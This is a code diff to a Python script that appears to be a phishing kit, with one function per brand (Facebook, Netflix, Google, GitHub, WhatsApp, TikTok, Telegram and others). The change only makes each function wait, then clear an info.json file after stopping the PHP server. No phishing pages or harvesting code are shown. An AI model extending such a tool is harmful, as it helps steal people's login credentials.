@@ -534,9 +534,13 @@ def facebook():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
   
 #option 3 ====================================================================================================
@@ -719,9 +723,13 @@ def netflix():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
 
 
@@ -905,9 +913,13 @@ def Google():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
    
 #option 5 ====================================================================================================
@@ -1091,9 +1103,13 @@ def Github():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit() 
 
 #option 6 ====================================================================================================
@@ -1278,9 +1294,13 @@ def Pubg():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     
 #option 7====================================================================================================
@@ -1467,9 +1487,13 @@ def follower():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
 
 
@@ -1640,9 +1664,13 @@ def Whatsapp():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     
     
@@ -1813,9 +1841,13 @@ def Tiktok():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
         
 
@@ -1986,9 +2018,13 @@ def Telegram():
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sleep(2)
+        open("info.json" , "w").close()
         sys.exit()
         
         
